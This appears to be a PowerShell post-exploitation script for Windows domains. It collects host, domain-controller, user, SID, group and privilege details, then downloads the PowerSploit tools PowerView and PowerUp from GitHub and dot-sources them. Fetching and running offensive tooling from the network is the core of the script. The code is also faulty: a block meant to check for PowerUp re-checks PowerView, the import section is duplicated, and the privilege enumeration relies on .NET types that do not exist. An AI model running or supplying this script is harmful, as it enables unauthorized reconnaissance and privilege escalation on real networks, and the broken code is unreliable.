## Computer information
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryContext()
$domainController = ([System.DirectoryServices.ActiveDirectory.DomainController]::FindOne($domainContext)).Name
$logonserver=$Env:LOGONSERVER

## User information
$windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userName = $windowsIdentity.Name
$sid = $windowsIdentity.User.Value
$groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}

## Privileges
$privilegeType = [System.Enum]::GetValues([System.Security.AccessControl.PrivilegeType])
$privileges = $privilegeType | ForEach-Object {
    $privilege = New-Object System.Security.AccessControl.Privilege($_)
    $isEnabled = $privilege.EnablePrivilege()
    if ($isEnabled) {
        $_.ToString()
    }
}

Write-Host "`n"
Write-Host "## Computer information"
Write-Host "Hostname: $computerName"
Write-Host "Local IP address: $localIP"
Write-Host "Domain: $domain"
Write-Host "Domain Controller: $domainController"
Write-Host "Logged on from: $logonserver"

Write-Host "`n"
Write-Host "## User information"
Write-Host "Current user: $userName"
Write-Host "SID: $sid"
Write-Host "`n"
Write-Host "Groups:`n$($groups -join "`n")"
Write-Host "`n"
Write-Host "Privileges:`n$($privileges -join "`n")"


Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules
## Check for PowerView module and download if missing
if (-not (Get-Module -Name PowerView -ListAvailable)) {
    Write-Output "PowerView module not found, downloading to current directory..."
    try {
        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
        Write-Output "PowerView downloaded successfully"
    } catch {
        Write-Output "Could not download PowerView: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerView module found"
}

## Check for PowerUp module and download if missing
if (-not (Get-Module -Name PowerView -ListAvailable)) {
    Write-Output "PowerView module not found, downloading to current directory..."
    try {
        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
        Write-Output "PowerView downloaded successfully"
    } catch {
        Write-Output "Could not download PowerView: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerView module found"
}

Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules
## Check for PowerView module and download if missing
if (-not (Get-Module -Name PowerView -ListAvailable)) {
    Write-Output "PowerView module not found, downloading to current directory..."
    try {
        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
        Write-Output "PowerView downloaded successfully"
    } catch {
        Write-Output "Could not download PowerView: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerView module found"
}

## Check for PowerUp module and download if missing
if (-not (Get-Module -Name PowerUp -ListAvailable)) {
    Write-Output "PowerUp module not found, downloading to current directory..."
    try {
        $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -UseBasicParsing
        $puContent.Content | Out-File -FilePath ".\PowerUp.ps1"
        Write-Output "PowerUp downloaded successfully"
    } catch {
        Write-Output "Could not download PowerUp: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerUp module found"
}

## Import PowerView script if available
if (Test-Path ".\PowerView.ps1") {
    try {
        Write-Output "Importing PowerView module..."
        . ".\PowerView.ps1"
        Write-Output "PowerView imported successfully"
        }
        catch {
        Write-Output "Could not IMPORT PowerView: $($_.Exception.Message)"
    }
        }

## Import PowerUp script if available
if (Test-Path ".\PowerUp.ps1") {
    try {
        Write-Output "Importing PowerUp module..."
        . ".\PowerUp.ps1"
        Write-Output "PowerUp imported successfully"
        }
        catch {
        Write-Output "Could not IMPORT PowerUp: $($_.Exception.Message)"
    }
        }
